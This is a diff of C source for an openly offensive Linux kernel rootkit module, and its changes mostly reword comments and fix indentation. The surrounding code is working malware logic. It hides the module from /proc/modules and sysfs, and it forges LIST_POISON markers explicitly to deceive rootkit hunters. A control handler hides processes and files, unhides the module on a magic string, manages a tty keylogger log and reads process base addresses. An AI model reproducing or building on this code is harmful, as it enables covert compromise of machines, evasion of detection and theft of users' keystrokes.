@@ -232,13 +232,11 @@ static void kv_hide_mod(void) {
      */
     kv_list_del(this_list.prev, this_list.next);
 
-    /**
-     * Swap LIST_POISON in order to trick
-     * some rk hunters that will look for
-     * the markers set by list_del()
-     *
-     * It should be OK as long as you don't run
-     * list debug on this one (lib/list_debug.c)
+    /*
+     * To deceive certain rootkit hunters scanning for
+     * markers set by list_del(), we perform a swap with
+     * LIST_POISON. This strategy should be effective,
+     * as long as you don't enable list debugging (lib/list_debug.c).
      */
     this_list.next = (struct list_head*)LIST_POISON2;
     this_list.prev = (struct list_head*)LIST_POISON1;
@@ -262,10 +260,10 @@ static void kv_hide_mod(void) {
 }
 
 /*
- * Restore module entries in
- * /proc/modules and /sys/module/<module>/
- * After this function is called the best next
- * thing to do is to rmmod the module.
+ * This function is responsible for restoring module entries in both
+ * /proc/modules and /sys/module/<module>/. After this function is
+ * executed, the recommended action is to proceed with the rmmod
+ * command to unload the module safely.
  */
 static void kv_unhide_mod(void) {
     int err;
@@ -275,12 +273,12 @@ static void kv_unhide_mod(void) {
         return;
 
     /*
-     * sysfs is tied inherently to kernel objects, here
-     * we restore the bare minimum of sysfs entries
-     * that will be needed when rmmod comes
+     * Sysfs is intrinsically linked to kernel objects. In this section,
+     * we reinstate only the essential sysfs entries required when
+     * performing rmmod.
      *
-     * sysfs will look like this
-     * after restoration:
+     * After the restoration process, the sysfs structure will
+     * appear as follows:
      *
      * /sys/module/<MODNAME>/
      * ├── holders
@@ -292,7 +290,7 @@ static void kv_unhide_mod(void) {
     /** Sets back the active state */
     lkmmod.this_mod->state = MODULE_STATE_LIVE;
 
-     /** MODNAME is the parent kernel object */
+    /** MODNAME is the parent kernel object */
     err = kobject_add(&(lkmmod.this_mod->mkobj.kobj), rmmod_ctrl.parent, "%s", MODNAME);
     if (err)
         goto out_put_kobj;
@@ -361,7 +359,7 @@ static void set_elfbits(char *bits) {
     }
 }
 
-/** XXX: fix this stupid API */
+/** XXX: fix/improve this API */
 static struct elfbits_t *get_elfbits(bool *ready) {
     spin_lock(&elfbits_spin);
     if (ElfBits.ready) {
@@ -452,9 +450,9 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
 
     pid = (pid_t)simple_strtol((const char*)buf, NULL, 10);
     /**
-     * Please, INIT is a no-goer
-     * Tip: stay safe by avoiding to hide
-     * system tasks
+     * Caution: INIT is off-limits
+     * Tip: Ensure safety by refraining from hiding
+     * essential system tasks
      */
     if(pid > 1)
         kv_hide_task_by_pid(pid, 0, CHILDREN);
@@ -479,10 +477,10 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
         } else if(!strcmp(buf, magik) && op_lock) {
             op_lock = 0;
             kv_unhide_mod();
-        /* list hidden tasks */
+            /* list hidden tasks */
         } else if(!strcmp(buf, "-s")) {
             kv_show_saved_tasks();
-        /* add name to the list of hidden files/directories */
+            /* add name to the list of hidden files/directories */
         } else if(!strncmp(buf, "-a", MIN(2, size))) {
             char *s = &buf[3];
             s[strcspn(s, " ")] = 0;
@@ -490,7 +488,7 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
                 const char *tmp[] = {s,NULL};
                 fs_add_name_rw(tmp);
             }
-        /* unhide file/directory */
+            /* unhide file/directory */
         } else if(!strncmp(buf, "-d", MIN(2, size))) {
             char *s = &buf[3];
             s[strcspn(s, " ")] = 0;
@@ -498,16 +496,16 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
                 const char *tmp[] = {s,NULL};
                 fs_del_name(tmp);
             }
-        /* show current hidden files/directories */
+            /* show current hidden files/directories */
         } else if(!strcmp(buf, "-l")) {
             fs_list_names();
-        /* set tty log file to be removed on rmmod */
+            /* set tty log file to be removed on rmmod */
         } else if (!strcmp(buf, "-t0")) {
-                kv_keylog_rm_log(true);
-        /* unset tty log file to be removed on rmmod */
+            kv_keylog_rm_log(true);
+            /* unset tty log file to be removed on rmmod */
         } else if (!strcmp(buf, "-t1")) {
-                kv_keylog_rm_log(false);
-        /* fetch base address of process */
+            kv_keylog_rm_log(false);
+            /* fetch base address of process */
         } else if (!strncmp(buf, "-b", MIN(2, size))) {
             char *tmp = &buf[3];
             tmp[strcspn(tmp, " ")] = 0;
